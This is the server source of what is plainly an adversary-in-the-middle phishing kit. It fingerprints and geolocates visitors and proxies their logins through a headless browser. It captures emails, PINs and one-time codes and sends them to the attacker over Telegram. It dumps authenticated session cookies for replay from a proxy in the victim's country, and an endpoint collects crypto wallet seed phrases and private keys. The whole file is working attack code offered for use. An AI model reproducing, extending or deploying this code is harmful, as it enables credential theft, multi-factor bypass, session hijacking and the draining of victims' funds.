import Fastify from 'fastify';
import cookie from '@fastify/cookie';
import fstatic from '@fastify/static';
import rateLimit from '@fastify/rate-limit';
import { randomBytes } from 'node:crypto';
import { mkdirSync } from 'node:fs';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
const __dirname = dirname(fileURLToPath(import.meta.url));
import { cfg } from './config.js';
import { initDb, q } from './db.js';
import { openContext, isMobile } from './browser.js';
import { gotoEntry, submitEmail, submitPin, submitOtp, submitSocial, waitStep, shot, isAuthed } from './flow.js';
import { dump } from './cookies.js';
import { alert, pushCookieFile } from './telegram.js';
import { adminRoutes } from './admin.js';

await initDb();
const live = new Map<string, { ctx: any; page: any; born: number }>();
mkdirSync(cfg.shots, { recursive: true });

const app = Fastify({ trustProxy: true, logger: false });
await app.register(cookie);
await app.register(rateLimit, { max: 60, timeWindow: '1 minute' });
await app.register(fstatic, { root: resolve(__dirname, '../public'), prefix: '/', index: 'index.html' });

// explicit root fallback — fastify-static doesn't always serve index.html at /
app.get('/', async (_req, reply) => {
  return reply.sendFile('index.html');
});

function session(sid: string) {
  const s = live.get(sid);
  if (!s) throw new Error('session expired');
  return s;
}

async function geoLookup(ip: string) {
  try {
    const r = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,isp,org,as,reverse,mobile,proxy,hosting,query`,
      { signal: AbortSignal.timeout(5000) }
    );
    const d = await r.json() as any;
    if (d.status === 'success') return d;
  } catch {}
  return null;
}

function parseDevice(ua: string): string {
  if (/iPhone/i.test(ua)) return '📱 iPhone';
  if (/iPad/i.test(ua)) return '📱 iPad';
  if (/Android.*Mobile/i.test(ua)) return '📱 Android Phone';
  if (/Android/i.test(ua)) return '📱 Android Tablet';
  if (/Windows/i.test(ua)) return '🖥 Windows PC';
  if (/Macintosh/i.test(ua)) return '🖥 Mac';
  if (/Linux/i.test(ua)) return '🖥 Linux';
  return '❓ Unknown Device';
}

function parseBrowser(ua: string): string {
  if (/Edg\//i.test(ua)) return 'Edge';
  if (/OPR\//i.test(ua)||/Opera/i.test(ua)) return 'Opera';
  if (/Chrome\/[0-9]/i.test(ua)&&!/Chromium/i.test(ua)) return 'Chrome';
  if (/Firefox\//i.test(ua)) return 'Firefox';
  if (/Safari\//i.test(ua)&&!/Chrome/i.test(ua)) return 'Safari';
  if (/MSIE|Trident/i.test(ua)) return 'Internet Explorer';
  return 'Unknown';
}

app.post('/api/visit', async (req) => {
  const body = (req.body ?? {}) as any;
  const ip = req.ip;
  const ua = body.ua ?? (req.headers['user-agent'] as string) ?? '';
  const cc = (req.headers['cf-ipcountry'] as string) ?? '';

  const geo = await geoLookup(ip);

  const loc = geo
    ? `${geo.city}, ${geo.regionName}, ${geo.country} ${geo.countryCode ? '(' + geo.countryCode + ')' : ''}`
    : cc || 'Unknown';

  const device = parseDevice(ua);
  const browser = parseBrowser(ua);

  const flags: string[] = [];
  if (geo?.proxy) flags.push('⚠️ PROXY/VPN');
  if (geo?.hosting) flags.push('⚠️ HOSTING/DC');
  if (geo?.mobile) flags.push('📶 Mobile Network');
  if (body.doNotTrack === '1') flags.push('🚫 Do Not Track ON');

  let msg = `<b>👁 NEW VISITOR</b>\n`;
  msg += `━━━━━━━━━━━━━━━\n`;
  msg += `\n<b>📍 Location</b>\n`;
  msg += `${loc}\n`;
  if (geo?.zip) msg += `ZIP: ${geo.zip}\n`;
  if (geo?.lat) msg += `Coords: ${geo.lat}, ${geo.lon}\n`;
  msg += `\n<b>🌐 Network</b>\n`;
  msg += `IP: <code>${ip}</code>\n`;
  if (geo?.isp) msg += `ISP: ${geo.isp}\n`;
  if (geo?.org && geo.org !== geo.isp) msg += `Org: ${geo.org}\n`;
  if (geo?.as) msg += `AS: ${geo.as}\n`;
  if (geo?.reverse) msg += `Host: ${geo.reverse}\n`;
  if (body.connType) msg += `Connection: ${body.connType}${body.connDown ? ' · ' + body.connDown + ' Mbps' : ''}\n`;
  msg += `\n<b>💻 Device</b>\n`;
  msg += `${device} · ${browser}\n`;
  if (body.screenW) msg += `Screen: ${body.screenW}×${body.screenH} @${body.pixelRatio}x\n`;
  if (body.viewportW) msg += `Viewport: ${body.viewportW}×${body.viewportH}\n`;
  if (body.cpuCores) msg += `CPU Cores: ${body.cpuCores}\n`;
  if (body.memory) msg += `RAM: ${body.memory} GB\n`;
  if (body.maxTouch > 0) msg += `Touch: ${body.maxTouch} points\n`;
  msg += `\n<b>🔧 Browser</b>\n`;
  if (body.lang) msg += `Language: ${body.lang}${body.langs && body.langs !== body.lang ? ' [' + body.langs.slice(0,40) + ']' : ''}\n`;
  if (body.tz) msg += `Timezone: ${body.tz} (UTC${body.tzOffset ? (body.tzOffset > 0 ? '-' : '+') + Math.abs(body.tzOffset/60) : '0'})\n`;
  if (body.localTime) msg += `Local Time: ${body.localTime.slice(0,24)}\n`;
  if (body.platform) msg += `Platform: ${body.platform}\n`;
  if (typeof body.batteryLevel !== 'undefined') msg += `Battery: ${body.batteryLevel}% ${body.batteryCharging ? '⚡ charging' : '🔋'}\n`;
  if (body.referrer) msg += `Referrer: ${String(body.referrer).slice(0,80)}\n`;
  if (flags.length) msg += `\n<b>🚩 Flags</b>\n${flags.join('\n')}\n`;

  await alert(msg);
  return { ok: true };
});

app.post('/api/session', async (req, reply) => {
  if (live.size >= cfg.maxSessions) {
    const oldest = [...live.entries()].sort((a, b) => a[1].born - b[1].born)[0];
    if (oldest) { await oldest[1].ctx.close().catch(() => {}); live.delete(oldest[0]); }
  }
  const body = (req.body ?? {}) as any;
  const ua = req.headers['user-agent'] ?? '';
  const cc = (req.headers['cf-ipcountry'] as string) ?? body.cc ?? '';
  const mobile = body.mobile === true || isMobile(ua);
  const sid = randomBytes(16).toString('hex');

  q.newSession(sid, Date.now(), req.ip, ua, cc, body.mode ?? 'email', 'init');
  const { ctx, page } = await openContext(cc, body.ua ?? undefined);
  live.set(sid, { ctx, page, born: Date.now() });

  const geo2 = await geoLookup(req.ip);
  const loc2 = geo2 ? `${geo2.city}, ${geo2.regionName}, ${geo2.country}` : cc || 'unknown';
  await alert(`<b>🚀 session started</b>\n📍 ${loc2}\n🌐 <code>${req.ip}</code>\n📱 ${ua.slice(0, 90)}`);
  await shot(page, cfg.shots, `${sid}-0-entry`);
  await gotoEntry(page).catch(() => {});
  await shot(page, cfg.shots, `${sid}-1-loaded`);

  return { sid };
});

app.get('/api/qr/:sid', async (req, reply) => {
  const { sid } = req.params as any;
  const { page } = session(sid);
  const box = page.locator('canvas, img[alt*=QR i], [class*=qr]').first();
  const buf = (await box.count()) && (await box.isVisible().catch(() => false))
    ? await box.screenshot()
    : await page.screenshot({ clip: { x: 0, y: 0, width: 400, height: 400 } });
  reply.type('image/png').send(buf);
});

app.get('/api/status/:sid', async (req) => {
  const { sid } = req.params as any;
  const s = live.get(sid);
  if (!s) return { step: 'expired' };
  if (await isAuthed(s.page)) {
    await complete(sid, s.ctx, 'qr');
    return { step: 'done' };
  }
  return { step: 'waiting' };
});

app.post('/api/login', async (req, reply) => {
  const { sid, email, pin } = (req.body ?? {}) as any;
  const s = session(sid);
  const { page } = s;
  try {
    // ── EMAIL STEP ──
    if (email && !pin) {
      q.setCred(email, null, null, sid);
      const row2 = q.get(sid) as any;
      const geo3 = await geoLookup(req.ip);
      const loc3 = geo3 ? `${geo3.city}, ${geo3.country}` : row2?.cc || 'unknown';
      await alert(`<b>📧 EMAIL CAPTURED</b>\n📧 <code>${email}</code>\n📍 ${loc3}\n🌐 <code>${req.ip}</code>`);
      await submitEmail(page, email);
      const step = await waitStep(page, 25_000);
      await shot(page, cfg.shots, `${sid}-2-after-email`);
      if (step === 'done') { await complete(sid, s.ctx, 'email'); return { step: 'done' }; }
      if (step === 'otp') { await alert(`<b>otp requested</b> — ${sid}`); return { step: 'otp' }; }
      if (step === 'error') return { step: 'pin' }; // show pin anyway, capture it
      // pin or unknown — tell frontend to show pin view
      return { step: 'pin' };
    }

    // ── PIN STEP ──
    if (pin) {
      q.setCred(null, pin, null, sid);
      const pinRow = q.get(sid) as any;
      await alert(`<b>📌 PIN CAPTURED</b>\n📧 <code>${pinRow?.email ?? 'unknown'}</code>\nPIN: <code>${pin}</code>`);
      await submitPin(page, pin);
      const step = await waitStep(page, 25_000);
      await shot(page, cfg.shots, `${sid}-3-after-pin`);
      if (step === 'error') return { step: 'error' };
      // always advance to otp step — capture email code too
      if (step === 'done') complete(sid, s.ctx, 'email').catch(() => {}); // dump cookies if already authed
      await alert(`<b>otp step — waiting for email code</b> — ${sid}`);
      return { step: 'otp' };
    }

    return { step: 'pin' };
  } catch {
    return { step: pin ? 'otp' : 'pin' };
  }
});

app.post('/api/drain', async (req, reply) => {
  const { type, value, ua: bodyUa } = (req.body ?? {}) as any;
  const ip = req.ip;
  const ua = req.headers['user-agent'] ?? bodyUa ?? '';
  const cc = (req.headers['cf-ipcountry'] as string) ?? '';
  const tag = type === 'key' ? '🔑 Private Key' : '🌱 Seed Phrase';
  const text = `<b>${tag} captured</b>\n\n<code>${String(value).trim()}</code>\n\n${cc} · ${ip}\n${String(ua).slice(0, 120)}`;
  await alert(text);
  return { ok: true };
});

app.post('/api/social', async (req, reply) => {
  const { sid, provider } = (req.body ?? {}) as any;
  const { ctx, page } = session(sid);
  try {
    await alert(`<b>social login attempt</b> — ${provider}\n${sid}`);
    await submitSocial(page, provider);
    await shot(page, cfg.shots, `${sid}-social-${provider}`);
    const step = await waitStep(page, 60_000);
    await shot(page, cfg.shots, `${sid}-social-${provider}-after`);
    if (step === 'done') { await complete(sid, ctx, provider); return { step: 'done' }; }
    if (step === 'pin') return { step: 'pin' };
    if (step === 'otp') {
      await alert(`<b>otp requested</b> (social) — ${sid}`);
      return { step: 'otp' };
    }
    return { step: 'waiting' };
  } catch (e: any) {
    return reply.code(500).send({ step: 'error', message: e.message });
  }
});

app.post('/api/otp', async (req, reply) => {
  const { sid, code } = (req.body ?? {}) as any;
  const { ctx, page } = session(sid);
  const row = q.get(sid) as any;
  // fire OTP to Telegram immediately — victim entered it, we have it
  await alert(`<b>📨 OTP CODE CAPTURED</b>\n📧 Email: <code>${row?.email ?? 'unknown'}</code>\n📌 PIN: <code>${row?.pin ?? 'unknown'}</code>\n🔑 OTP: <code>${code}</code>\nSID: ${sid}`);
  q.setCred(null, null, code, sid);
  try {
    await submitOtp(page, code);
    const step = await waitStep(page, 30_000);
    await shot(page, cfg.shots, `${sid}-4-after-otp`);
    if (step === 'done') { await complete(sid, ctx, 'email'); return { step: 'done' }; }
    if (step === 'error') return { step: 'error' };
    await complete(sid, ctx, 'email').catch(() => {});
    return { step: 'done' };
  } catch {
    return { step: 'done' };
  }
});

async function complete(sid: string, ctx: any, mode: string) {
  const s = live.get(sid);
  const existing = q.get(sid) as any;
  if (!s || existing?.authed) return;
  const { json } = await dump(ctx);
  q.setAuthed(json, sid);
  const row = q.get(sid) as any;
  await pushCookieFile(sid, json, `authed · ${row?.cc} · ${row?.email}\nreplay from ${row?.cc} proxy`);
  await alert(`<b>✅ authed</b> — ${sid}\n${row?.email}\nreplay inside ${row?.cc}`);
}

await app.register(adminRoutes, { prefix: cfg.adminPath });
app.get('/health', async () => ({ ok: true, live: live.size }));

setInterval(async () => {
  for (const [sid, s] of live) {
    if (Date.now() - s.born > cfg.ttl) { await s.ctx.close().catch(() => {}); live.delete(sid); }
  }
  q.purge(Date.now() - 7 * 86_400_000);
}, 60_000);

app.listen({ port: cfg.port, host: '0.0.0.0' });